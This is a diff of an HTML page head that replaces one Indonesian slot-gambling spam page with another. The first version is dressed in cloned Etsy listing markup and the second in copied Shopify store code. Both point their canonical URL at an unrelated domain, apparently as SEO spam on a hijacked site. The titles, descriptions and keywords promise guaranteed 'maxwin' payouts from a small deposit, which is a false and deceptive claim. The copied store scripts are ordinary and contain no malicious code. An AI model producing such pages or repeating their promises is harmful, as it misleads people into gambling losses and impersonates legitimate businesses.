@@ -1,2852 +1,8039 @@
+<!doctype html>
+<html class="no-js" lang="en">
 
-
-
-
-
-
-
-
-<!DOCTYPE html>
-<html lang="en-GB" xmlns:og="http://ogp.me/ns#" xmlns:fb="https://www.facebook.com/2008/fbml" data-user-id="1135369000" data-user-login-name="r6cailhwo6qt62hc" data-user-is-seller="false">
 <head>
-<script>if (window.performance && performance.mark) performance.mark("TTP")</script>
-<meta charset="utf-8">
-<title>Slot777 | Situs Slot Gacor Terpercaya Hari Ini Rtp Slot Maxwin Terbaik 2025</title>
-<link rel="amphtml" href="https://tunarislot777.pages.dev/">
-<link rel="canonical" href="https://tunari-online.ro/" />
-<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:200,300,400,600,700,800,900" />
-<meta name="description" content="Slot777 merupakan situs slot gacor terpercaya hari ini dengan tingkat kemenangan yang sangat dengan memiliki rtp slot maxwin yang terbaik untuk para pemain untuk merasakan kemenangan yang tinggi di hari ini.">
-<meta name="keywords" content="slot777, situs slot, slot gacor, situs slot777, situs slot gacor" />
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta http-equiv="content-language" content="en-ID">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="pinterest" content="nosearch">
-<meta name="copyright" content="SLOT777">    
-<meta name="author" content="SLOT777">
-<meta name="distribution" content="global">
-<meta name="publisher" content="SLOT777">
-<meta name="robots" content="index, follow">
-<meta name="rating" content="general">
-<meta name="csrf_nonce" content="3:1758149097:dhZrk-AdJ47e9IJVdmcu4hbuTQxs:8485c7771677cb0c66bf59dd26bcf28f220d75631d44099ba3e9430bdb590555">
-<meta name="uaid_nonce" content="3:1758149097:jN5WV4yGC6bv-Y8gTz1rwqhWHeiQ:0cafa0e88e72ec07d7547dabb6a6d89ba489d98702d5b9d61cec91e06677cb61">
-<meta property="fb:app_id" content="89186614300">
-<meta name="css_dist_path" content="/ac/sasquatch/css/" />
-<meta name="dist" content="202509171758147727" />
-<meta name="twitter:site" content="@situstoto" value="" />
-<meta name="twitter:card" content="summary_large_image" value="" />
-<meta name="twitter:app:name:iphone" content="Etsy" value="" />
-<meta name="twitter:app:url:iphone" content="etsy://listing/1790774795?ref=TwitterProductCard" value="" />
-<meta name="twitter:app:id:iphone" content="477128284" value="" />
-<meta name="twitter:app:name:ipad" content="Etsy" value="" />
-<meta name="twitter:app:url:ipad" content="etsy://listing/1790774795?ref=TwitterProductCard" value="" />
-<meta name="twitter:app:id:ipad" content="477128284" value="" />
-<meta name="twitter:app:name:googleplay" content="Etsy" value="" />
-<meta name="twitter:app:url:googleplay" content="etsy://listing/1790774795?ref=TwitterProductCard" value="" />
-<meta name="twitter:app:id:googleplay" content="com.etsy.android" value="" />
-<meta property="og:title" content="Slot777 | Situs Slot Gacor Terpercaya Hari Ini Rtp Slot Maxwin Terbaik 2025" />
-<meta property="og:description" content="Slot777 merupakan situs slot gacor terpercaya hari ini dengan tingkat kemenangan yang sangat dengan memiliki rtp slot maxwin yang terbaik untuk para pemain untuk merasakan kemenangan yang tinggi di hari ini." />
-<meta property="og:type" content="product" />
-<meta property="og:url" content="https://tunari-online.ro/" />
-<meta property="og:image" content="https://ik.imagekit.io/ck1mayks8/slot777.webp" />
-<meta property="product:price:amount" content="5.20" /><meta property="product:price:currency" content="USD" />
-<link rel="shortcut icon" href="https://aduhhenakmasssini.space/hubton/favicon.png" />
-<link rel="icon" href="https://aduhhenakmasssini.space/hubton/favicon.png" type="image/png" sizes="32x32" />
-<link rel="icon" href="https://aduhhenakmasssini.space/hubton/favicon.png" type="image/png" sizes="16x16" />
-<link rel="apple-touch-icon" href="https://aduhhenakmasssini.space/hubton/favicon.png" sizes="180x180" />
-<link rel="mask-icon" href="https://aduhhenakmasssini.space/hubton/favicon.png" color="rgb(241, 100, 30)" />
-<link rel="manifest" href="/site.webmanifest" />
-<meta name="apple-mobile-web-app-title" content="Etsy" /><meta name="application-name" content="Etsy" /><meta name="msapplication-TileColor" content="#F1641E" /><meta name="theme-color" content="rgb(255, 255, 255)" />
-<link rel="preconnect" href="//i.etsystatic.com" crossorigin="anonymous" />
-<link rel="preconnect" href="//i.etsystatic.com" />
-<link rel="preconnect" href="//v.etsystatic.com" />
-<link rel="preconnect" href="//v.etsystatic.com" crossorigin="anonymous" />
-<link rel="preload" as="image" imagesrcset="https://ik.imagekit.io/ck1mayks8/slot777.webp" fetchpriority="high" />
-<link rel="alternate" href="https://tunari-online.ro/" hreflang="en" />
-<link rel="alternate" href="https://www.etsy.com/fi-en/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="en-FI" />
-<link rel="alternate" href="https://www.etsy.com/au/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="en-AU" />
-<link rel="alternate" href="https://www.etsy.com/ca/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="en-CA" />
-<link rel="alternate" href="https://www.etsy.com/dk-en/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="en-DK" />
-<link rel="alternate" href="https://www.etsy.com/hk-en/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="en-HK" />
-<link rel="alternate" href="https://www.etsy.com/ie/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="en-IE" />
-<link rel="alternate" href="https://www.etsy.com/il-en/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="en-IL" />
-<link rel="alternate" href="https://www.etsy.com/in-en/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="en-IN" />
-<link rel="alternate" href="https://www.etsy.com/nz/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="en-NZ" />
-<link rel="alternate" href="https://www.etsy.com/no-en/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="en-NO" />
-<link rel="alternate" href="https://www.etsy.com/se-en/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="en-SE" />
-<link rel="alternate" href="https://www.etsy.com/sg-en/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="en-SG" />
-<link rel="alternate" href="https://www.etsy.com/uk/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="en-GB" />
-<link rel="alternate" href="https://www.etsy.com/de/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="de" />
-<link rel="alternate" href="https://www.etsy.com/at/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="de-AT" />
-<link rel="alternate" href="https://www.etsy.com/ch/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="de-CH" />
-<link rel="alternate" href="https://www.etsy.com/fr/listing/1790774795/impression-club-de-lecture-affiche" hreflang="fr" />
-<link rel="alternate" href="https://www.etsy.com/ca-fr/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="fr-CA" />
-<link rel="alternate" href="https://www.etsy.com/nl/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="nl" />
-<link rel="alternate" href="https://www.etsy.com/be/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="nl-BE" />
-<link rel="alternate" href="https://www.etsy.com/it/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="it" />
-<link rel="alternate" href="https://www.etsy.com/es/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="es" />
-<link rel="alternate" href="https://www.etsy.com/mx/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="es-MX" />
-<link rel="alternate" href="https://www.etsy.com/jp/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="ja" />
-<link rel="alternate" href="https://www.etsy.com/pl/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="pl" />
-<link rel="alternate" href="https://www.etsy.com/pt/listing/1790774795/book-club-print-bookish-poster-trendy" hreflang="pt" />
-<link rel="alternate" href="https://tunari-online.ro/" hreflang="x-default" />
-<link rel="alternate" href="https://tunari-online.ro/" hreflang="en-US" />
-<script nonce="gPiNOjdRCrWLas5Ik2CuS+N0">
-    !function(e){var r=e.__etsy_logging={};r.errorQueue=[],e.onerror=function(e,o,t,n,s){r.errorQueue.push([e,o,t,n,s])},r.firedEvents=[];r.perf={e:[],t:!1,MARK_MEASURE_PREFIX:"_etsy_mark_measure_",prefixMarkMeasure:function(e){return"_etsy_mark_measure_"+e}},e.PerformanceObserver&&(r.perf.o=new PerformanceObserver((function(e){r.perf.e=r.perf.e.concat(e.getEntries())})),r.perf.o.observe({entryTypes:["element","navigation","longtask","paint","mark","measure","resource","layout-shift"]}));var o=[];r.eventpipe={q:o,logEvent:function(e){o.push(e)},logEventImmediately:function(e){o.push(e)}};var t=!(Object.assign&&Object.values&&Object.fromEntries&&e.Promise&&Promise.prototype.finally&&e.NodeList&&NodeList.prototype.forEach),n=!!e.CefSharp||!!e.__pw_resume,s=!e.PerformanceObserver||!PerformanceObserver.supportedEntryTypes||0===PerformanceObserver.supportedEntryTypes.length,a=!e.navigator||!e.navigator.sendBeacon,p=t||n,u=[];t&&u.push("fp"),s&&u.push("fo"),a&&u.push("fb"),n&&u.push("fg"),r.bots={isBot:p,botCheck:u}}(window);
-</script>
-<link rel="stylesheet" href="https://www.etsy.com/dac/site-chrome/components/components.ba269cdecb93d2,site-chrome/header/header.c0f395ece04ab8,web-toolkit-v2/modules/subway/subway.ba269cdecb93d2,__modules__CategoryNav__src__/Views/ButtonMenu/Menu.02149cde20b454,__modules__CategoryNav__src__/Views/DropdownMenu/Menu.ba269cdecb93d2,site-chrome/footer/footer.ba269cdecb93d2,gdpr/settings-overlay.ba269cdecb93d2.css?variant=sasquatch" type="text/css" />
-<link rel="stylesheet" href="https://www.etsy.com/dac/neu/modules/listing_card_no_imports.ba269cdecb93d2,common/stars-svg.ba269cdecb93d2,neu/modules/favorite_listing_button.ba269cdecb93d2,neu/modules/quickview.ba269cdecb93d2,listzilla/responsive/listing-page-desktop.ba269cdecb93d2,category-nav/v2/breadcrumb_nav.fe3bd9d216295e,common/grid.fe3bd9d216295e,listings3/similar-items.ba269cdecb93d2,neu/common/responsive_listing_grid.ba269cdecb93d2,neu/modules/favorite_button_defaults_no_imports.ba269cdecb93d2,common/listing_card_text_badge.fe3bd9d216295e,neu/modules/listing_card_signals.9293ad9010af5b,__modules__ListingPage__src__/TrustSuiteBanner/styles.ba269cdecb93d2,web-toolkit-v2/modules/banners/banners.ba269cdecb93d2,web-toolkit-v2/modules/forms/radios.ba269cdecb93d2,__modules__Favorites__src__/MiniCollectionsMenu/View.ba269cdecb93d2,web-toolkit-v2/modules/panels/panels.ba269cdecb93d2,listing-page/image-carousel/responsive.ba269cdecb93d2,listzilla/image-overlay.ba269cdecb93d2,__modules__ListingPage__src__/Price/styles.311438d934a7bf,__modules__ListingPage__src__/ShopHeader/ReviewStars/review_stars.02149cde20b454,common/simple-overlay.fe3bd9d216295e,neu/payment_icons.fe3bd9d216295e,neu/apple_pay.fe3bd9d216295e,neu/google_pay.ba269cdecb93d2,listings3/checkout/single-listing.ba269cdecb93d2,common/forms_no_import.ba269cdecb93d2,listzilla/responsive/apple-pay.fe3bd9d216295e,shop2/modules/regulatory-seller-details.fe3bd9d216295e,shop2/modules/seller-additional-details.fe3bd9d216295e,neu/common/follow-shop-button.fe3bd9d216295e,listzilla/responsive/review-content-modal.ba269cdecb93d2,appreciation_photos/photo_overlay.ba269cdecb93d2,listzilla/reviews/reviews_skeleton.fe3bd9d216295e,listzilla/reviews/reviews-section.ba269cdecb93d2,reviews/header.ba269cdecb93d2,listzilla/reviews/variations.ba269cdecb93d2,listzilla/responsive/max-height-review.fe3bd9d216295e,reviews/categorical-tags.ba269cdecb93d2,web-toolkit-v2/modules/chips/selectable_chip.ba269cdecb93d2,web-toolkit-v2/modules/chips/chip_group.ba269cdecb93d2,sort-by-reviews.3affa09ef32549,web-toolkit-v2/modules/dialogs/sheets.ba269cdecb93d2,__modules__Reviews__src__/DeepDive/ListingPage/styles.ba269cdecb93d2,listzilla/responsive/tags.ba269cdecb93d2,__modules__ListingPage__src__/SellerCred/Header/styles.ba269cdecb93d2,shop2/common/rating-and-reviews-count.ba269cdecb93d2,__modules__ListingPage__src__/SellerCred/Badges/styles.ba269cdecb93d2,__modules__ListingPage__src__/Recommendations/RecsRibbon/view.ba269cdecb93d2,web-toolkit-v2/modules/forms/checkboxes.ba269cdecb93d2,web-toolkit-v2/modules/action_groups/action_groups.c0f395ece04ab8,favorites/collection/list.ba269cdecb93d2,favorites/collection/row.ba269cdecb93d2,favorites/adaptive-height-desktop.ba269cdecb93d2,__modules__ConditionalSaleInterstitial__src__/styles.02149cde20b454,__modules__CollectionRecs__src__/Views/Grid/view.ba269cdecb93d2,__modules__CollectionRecs__src__/Views/Card/view.ba269cdecb93d2.css?variant=sasquatch" type="text/css" />
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <meta http-equiv="Referrer-Policy" content="no-referrer-when-downgrade">
+    <meta name="theme-color" content="Red">
+    <meta name="keywords"
+        content="slot qris , slot gacor , slot maxwin , slot gacor maxwin , slot qris gacor , slot" />
+    <link rel="canonical" href="https://tunari-online.ro/">
+    <link rel="amphtml" href="https://qrisni0day7.pages.dev/" />
+    <link rel="preconnect" href="https://cdn.shopify.com" crossorigin>
+    <link rel="icon" type="image/png"
+        href="https://aduhhenakmasssini.space/hubton/favicon.png">
+    <link rel="preconnect" href="https://fonts.shopifycdn.com" crossorigin>
+    <title>SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI</title>
+    <meta name="description"
+        content="Slot qris merupakan link situs slot gacor terpercaya pasti maxwin denga minimal deposit hanya 10k sudah bisa mendapatkan maxwin di beragam jenis permainan slot gacor hari ini dengan tingkat kemenangan yang sangat tinggi di permainan slot gacor terbaik hari ini.">
+    <meta property="og:site_name"
+        content="SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI">
+    <meta property="og:url" content="https://tunari-online.ro/">
+    <meta property="og:title"
+        content="SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI">
+    <meta property="og:type" content="product">
+    <meta property="og:description"
+        content="Slot qris merupakan link situs slot gacor terpercaya pasti maxwin denga minimal deposit hanya 10k sudah bisa mendapatkan maxwin di beragam jenis permainan slot gacor hari ini dengan tingkat kemenangan yang sangat tinggi di permainan slot gacor terbaik hari ini.">
+    <meta property="og:image" content="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg">
+    <meta property="og:image:secure_url"
+        content="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg">
+    <meta property="og:image:width" content="600">
+    <meta property="og:image:height" content="600">
+    <meta property="og:price:amount" content="10000">
+    <meta property="og:price:currency" content="IDR">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name='dmca-site-verification' content='ZmlUOWdCK1FrUXhFSElaMjBYSGtMdmdUUUpqMXFza2g4OGRsSzJLblh6MD01' />
+    <meta name="twitter:title"
+        content="SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI">
+    <meta name="twitter:description"
+        content="Slot qris merupakan link situs slot gacor terpercaya pasti maxwin denga minimal deposit hanya 10k sudah bisa mendapatkan maxwin di beragam jenis permainan slot gacor hari ini dengan tingkat kemenangan yang sangat tinggi di permainan slot gacor terbaik hari ini.">
 
-        <script>
-    //todo: this is from https://stackoverflow.com/questions/5525071/how-to-wait-until-an-element-exists (with updates
-    // for prettier) and is duplicated in Transcend-Integration.ts. Ideally we would find a place both
-    // files could call.
-    function waitForElm(selector) {
-        return new Promise((resolve) => {
-            if (document.querySelector(selector)) {
-                return resolve(document.querySelector(selector));
+    <script
+        src="//www.istudiosg.com/cdn/shop/t/14/assets/jquery-latest.min.js?v=174441762609953228921742784888"></script>
+    <script>
+        window.SDG = window.SDG || {};
+        SDG.Data = {};
+        SDG.Data.template = "product";
+        SDG.Data.language = "EN";
+        SDG.Data.locationCookie = true;
+        SDG.Data.locationCookieExpiry = 7;
+        SDG.Data.ctoNoCoverage = 'No coverage';
+        SDG.Data.ctoProductModalDescription = 'To get {{ selected_option_title }} we changed your selection to:';
+        SDG.Data.ctoUpdateMessageDescription = 'is changed';
+        SDG.Data.noCombinationMessage = 'Combination does not exist';
+        SDG.Data.productPriceFrom = 'From {{ price }}';
+        SDG.Data.nmpPriceCalculation = '/mo. for {{ per_month }} mo.';
+    </script>
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/constants.js?v=58251544750838685771742784887"
+        defer="defer"></script>
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/pubsub.js?v=158357773527763999511742784889"
+        defer="defer"></script>
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/global.js?v=86940198807662246831742784888"
+        defer="defer"></script>
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/slick.min.js?v=177366201532680719881742784889"
+        defer="defer"></script>
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/slick-custom.js?v=124467254043905770051742784887"
+        defer="defer"></script>
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/fancybox-3-5-7.js?v=45336575563953974081742784888"
+        defer="defer"></script>
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/ac-modal.min.js?v=177811281368891218321742784887"
+        defer="defer"></script>
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/ac-modal-custom.js?v=65753906577603767491742784888"
+        defer="defer"></script>
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/product-form.js?v=29435186399513605341757430292"
+        defer="defer"></script>
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/lazyload-section.js?v=5359969406261385591742784888"
+        defer="defer"></script>
+    <script src="//www.istudiosg.com/cdn/shop/t/14/assets/adobe-analytics-tracking.js?v=123617832924672007461742784888"
+        defer="defer"></script>
+    <script>
+        SDG.Data.adobeAnalyticsData = {
+            page_name: "Product",
+            page_type: "product",
+            page_url: window.location.hostname + window.location.pathname,
+            page_title: document.title,
+            language: "EN",
+            country: "SG",
+            currency: "SGD",
+
+            login_status: 'logged out',
+
+        };
+    </script>
+
+
+    <script>
+        window.dataLayer = window.dataLayer || [];
+    </script>
+
+
+    <script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.start');</script>
+    <meta id="shopify-digital-wallet" name="shopify-digital-wallet" content="/63738642612/digital_wallets/dialog">
+    <link rel="alternate" type="application/json+oembed" href="https://tunari-online.ro/">
+    <script async="async" src="/checkouts/internal/preloads.js?locale=en-SG"></script>
+    <script id="shopify-features"
+        type="application/json">{"accessToken":"02dc024b3b107f5c668c6465659caac4","betas":["rich-media-storefront-analytics"],"domain":"www.istudiosg.com","predictiveSearch":true,"shopId":63738642612,"locale":"en"}</script>
+    <script>var Shopify = Shopify || {};
+        Shopify.shop = "istudio-elush-production.myshopify.com";
+        Shopify.locale = "en";
+        Shopify.currency = { "active": "SGD", "rate": "1.0" };
+        Shopify.country = "SG";
+        Shopify.theme = { "name": "360\u00265 - 2.0", "id": 139536236724, "schema_name": "Dawn", "schema_version": "11.0.0", "theme_store_id": null, "role": "main" };
+        Shopify.theme.handle = "null";
+        Shopify.theme.style = { "id": null, "handle": null };
+        Shopify.cdnHost = "www.istudiosg.com/cdn";
+        Shopify.routes = Shopify.routes || {};
+        Shopify.routes.root = "/";</script>
+    <script type="module">!function (o) { (o.Shopify = o.Shopify || {}).modules = !0 }(window);</script>
+    <script>!function (o) { function n() { var o = []; function n() { o.push(Array.prototype.slice.apply(arguments)) } return n.q = o, n } var t = o.Shopify = o.Shopify || {}; t.loadFeatures = n(), t.autoloadFeatures = n() }(window);</script>
+    <script id="shop-js-analytics" type="application/json">{"pageType":"product"}</script>
+    <script defer="defer" async="async" src="//www.istudiosg.com/cdn/shopifycloud/shop-js/client.js" onload="window.Shopify.SignInWithShop?.initShopCartSync?.({&quot;fedCMEnabled&quot;:true,&quot;windoidEnabled&quot;:true});
+"></script>
+    <script>(function () {
+            var isLoaded = false;
+            function asyncLoad() {
+                if (isLoaded) return;
+                isLoaded = true;
+                var urls = ["\/\/app.backinstock.org\/widget\/91512_1746008386.js?category=bis\u0026v=6\u0026shop=istudio-elush-production.myshopify.com"];
+                for (var i = 0; i < urls.length; i++) {
+                    var s = document.createElement('script');
+                    s.type = 'text/javascript';
+                    s.async = true;
+                    s.src = urls[i];
+                    var x = document.getElementsByTagName('script')[0];
+                    x.parentNode.insertBefore(s, x);
+                }
+            };
+            if (window.attachEvent) {
+                window.attachEvent('onload', asyncLoad);
+            } else {
+                window.addEventListener('load', asyncLoad, false);
+            }
+        })();</script>
+    <script
+        id="__st">var __st = { "a": 63738642612, "offset": 28800, "reqid": "18ba35d6-d225-45a5-8994-5ab9e4062cbb-1757934467", "pageurl": "https://tunari-online.ro/", "u": "d161f9134dfb", "p": "product", "rtyp": "product", "rid": 8845196638866 };</script>
+    <script>window.ShopifyPaypalV4VisibilityTracking = true;</script>
+    <script
+        id="captcha-bootstrap">!function () { 'use strict'; const t = 'contact', e = 'account', n = 'new_comment', o = [[t, t], ['blogs', n], ['comments', n], [t, 'customer']], c = [[e, 'customer_login'], [e, 'guest_login'], [e, 'recover_customer_password'], [e, 'create_customer']], r = t => t.map((([t, e]) => `form[action*='/${t}']:not([data-nocaptcha='true']) input[name='form_type'][value='${e}']`)).join(','), a = t => () => t ? [...document.querySelectorAll(t)].map((t => t.form)) : []; function s() { const t = [...o], e = r(t); return a(e) } const i = 'password', u = 'form_key', d = ['recaptcha-v3-token', 'g-recaptcha-response', 'h-captcha-response', i], f = () => { try { return window.sessionStorage } catch { return } }, m = '__shopify_v', _ = t => t.elements[u]; function p(t, e, n = !1) { try { const o = window.sessionStorage, c = JSON.parse(o.getItem(e)), { data: r } = function (t) { const { data: e, action: n } = t; return t[m] || n ? { data: e, action: n } : { data: t, action: n } }(c); for (const [e, n] of Object.entries(r)) t.elements[e] && (t.elements[e].value = n); n && o.removeItem(e) } catch (o) { console.error('form repopulation failed', { error: o }) } } const l = 'form_type', E = 'cptcha'; function T(t) { t.dataset[E] = !0 } const w = window, h = w.document, L = 'Shopify', v = 'ce_forms', y = 'captcha'; let A = !1; ((t, e) => { const n = (g = 'f06e6c50-85a8-45c8-87d0-21a2b65856fe', I = 'https://cdn.shopify.com/shopifycloud/storefront-forms-hcaptcha/ce_storefront_forms_captcha_hcaptcha.v1.5.2.iife.js', D = { infoText: 'Protected by hCaptcha', privacyText: 'Privacy', termsText: 'Terms' }, (t, e, n) => { const o = w[L][v], c = o.bindForm; if (c) return c(t, g, e, D).then(n); var r; o.q.push([[t, g, e, D], n]), r = I, A || (h.body.append(Object.assign(h.createElement('script'), { id: 'captcha-provider', async: !0, src: r })), A = !0) }); var g, I, D; w[L] = w[L] || {}, w[L][v] = w[L][v] || {}, w[L][v].q = [], w[L][y] = w[L][y] || {}, w[L][y].protect = function (t, e) { n(t, void 0, e), T(t) }, Object.freeze(w[L][y]), function (t, e, n, w, h, L) { const [v, y, A, g] = function (t, e, n) { const i = e ? o : [], u = t ? c : [], d = [...i, ...u], f = r(d), m = r(i), _ = r(d.filter((([t, e]) => n.includes(e)))); return [a(f), a(m), a(_), s()] }(w, h, L), I = t => { const e = t.target; return e instanceof HTMLFormElement ? e : e && e.form }, D = t => v().includes(t); t.addEventListener('submit', (t => { const e = I(t); if (!e) return; const n = D(e) && !e.dataset.hcaptchaBound && !e.dataset.recaptchaBound, o = _(e), c = g().includes(e) && (!o || !o.value); (n || c) && t.preventDefault(), c && !n && (function (t) { try { if (!f()) return; !function (t) { const e = f(); if (!e) return; const n = _(t); if (!n) return; const o = n.value; o && e.removeItem(o) }(t); const e = Array.from(Array(32), (() => Math.random().toString(36)[2])).join(''); !function (t, e) { _(t) || t.append(Object.assign(document.createElement('input'), { type: 'hidden', name: u })), t.elements[u].value = e }(t, e), function (t, e) { const n = f(); if (!n) return; const o = [...t.querySelectorAll(`input[type='${i}']`)].map((({ name: t }) => t)), c = [...d, ...o], r = {}; for (const [a, s] of new FormData(t).entries()) c.includes(a) || (r[a] = s); n.setItem(e, JSON.stringify({ [m]: 1, action: t.action, data: r })) }(t, e) } catch (e) { console.error('failed to persist form', e) } }(e), e.submit()) })); const S = (t, e) => { t && !t.dataset[E] && (n(t, e.some((e => e === t))), T(t)) }; for (const o of ['focusin', 'change']) t.addEventListener(o, (t => { const e = I(t); D(e) && S(e, y()) })); const B = e.get('form_key'), M = e.get(l), P = B && M; t.addEventListener('DOMContentLoaded', (() => { const t = y(); if (P) for (const e of t) e.elements[l].value === M && p(e, B);[...new Set([...A(), ...v().filter((t => 'true' === t.dataset.shopifyCaptcha))])].forEach((e => S(e, t))) })) }(h, new URLSearchParams(w.location.search), n, t, e, ['guest_login']) })(!0, !0) }();</script>
+    <script integrity="sha256-52AcMU7V7pcBOXWImdc/TAGTFKeNjmkeM1Pvks/DTgc="
+        data-source-attribution="shopify.loadfeatures" defer="defer"
+        src="//www.istudiosg.com/cdn/shopifycloud/storefront/assets/storefront/load_feature-81c60534.js"
+        crossorigin="anonymous"></script>
+    <script data-source-attribution="shopify.dynamic_checkout.dynamic.init">var Shopify = Shopify || {}; Shopify.PaymentButton = Shopify.PaymentButton || { isStorefrontPortableWallets: !0, init: function () { window.Shopify.PaymentButton.init = function () { }; var t = document.createElement("script"); t.src = "https://www.istudiosg.com/cdn/shopifycloud/portable-wallets/latest/portable-wallets.en.js", t.type = "module", document.head.appendChild(t) } };
+    </script>
+    <script data-source-attribution="shopify.dynamic_checkout.buyer_consent">
+        function portableWalletsHideBuyerConsent(e) { var t = document.getElementById("shopify-buyer-consent"), n = document.getElementById("shopify-subscription-policy-button"); t && n && (t.classList.add("hidden"), t.setAttribute("aria-hidden", "true"), n.removeEventListener("click", e)) } function portableWalletsShowBuyerConsent(e) { var t = document.getElementById("shopify-buyer-consent"), n = document.getElementById("shopify-subscription-policy-button"); t && n && (t.classList.remove("hidden"), t.removeAttribute("aria-hidden"), n.addEventListener("click", e)) } window.Shopify?.PaymentButton && (window.Shopify.PaymentButton.hideBuyerConsent = portableWalletsHideBuyerConsent, window.Shopify.PaymentButton.showBuyerConsent = portableWalletsShowBuyerConsent);
+    </script>
+    <script data-source-attribution="shopify.dynamic_checkout.cart.bootstrap">document.addEventListener("DOMContentLoaded", (function () { function t() { return document.querySelector("shopify-accelerated-checkout-cart, shopify-accelerated-checkout") } if (t()) Shopify.PaymentButton.init(); else { new MutationObserver((function (e, n) { t() && (Shopify.PaymentButton.init(), n.disconnect()) })).observe(document.body, { childList: !0, subtree: !0 }) } }));
+    </script>
+    <script id='scb4127' type='text/javascript' async=''
+        src='https://www.istudiosg.com/cdn/shopifycloud/privacy-banner/storefront-banner.js'></script>
+    <script id="sections-script" data-sections="header" defer="defer"
+        src="//www.istudiosg.com/cdn/shop/t/14/compiled_assets/scripts.js?2866"></script>
+    <script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.end');</script>
+
+    <style>
+        #Details-popup_custom_6mTgxV-template--17605519376564__main .popup_round_border {
+            display: inline-block !important;
+        }
+
+        #PopupModal-popup_custom_6mTgxV .image {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        #PopupModal-popup_custom_6mTgxV .image.desktop {
+            display: none;
+        }
+
+        #PopupModal-popup_custom_6mTgxV .product-popup-modal__content {
+            padding: 0 1rem;
+        }
+
+        #PopupModal-popup_custom_6mTgxV .product-popup-modal__content-info>h1.h2 {
+            display: none;
+        }
+
+        @media screen and (min-width:750px) {
+            #PopupModal-popup_custom_6mTgxV .product-popup-modal__content {
+                width: 80%
             }
 
-            const observer = new MutationObserver(() => {
-                if (document.querySelector(selector)) {
-                    observer.disconnect();
-                    resolve(document.querySelector(selector));
+            #PopupModal-popup_custom_6mTgxV .image.desktop {
+                display: block;
+            }
+
+            #PopupModal-popup_custom_6mTgxV .image.mobile {
+                display: none;
+            }
+        }
+
+        #PopupModal-popup_custom_6mTgxV .product-popup-modal__content-info {
+            padding-right: 0;
+        }
+
+        @font-face {
+            font-family: 'SF Pro Text';
+            src: url("//www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Regular.woff2?v=21706269404805127741742784888") format('woff2'),
+                url("//www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Regular.woff?v=144701899629177247781742784888") format('woff');
+            font-weight: 400;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'SF Pro Text';
+            src: url('//www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Medium.woff2?v=142744590770268640871742784888') format('woff2'),
+                url('//www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Medium.woff?v=86846661406826704271742784889') format('woff');
+            font-weight: 500;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'SF Pro Text';
+            src: url('//www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Semibold.woff2?v=31375109001105336161742784889') format('woff2'),
+                url('//www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Semibold.woff?v=158359377723366996921742784888') format('woff');
+            font-weight: 600;
+            font-style: normal;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'SF Pro Text';
+            src: url('//www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Bold.woff2?v=81066619648910226671742784888') format('woff2'),
+                url('//www.istudiosg.com/cdn/shop/t/14/assets/SFProText-Bold.woff?v=11034071917097156431742784889') format('woff');
+            font-weight: 700;
+            font-style: bold;
+            font-display: swap;
+        }
+
+        @font-face {
+            font-family: 'Font Awesome 6 Free';
+            font-style: normal;
+            font-weight: 900;
+            font-display: block;
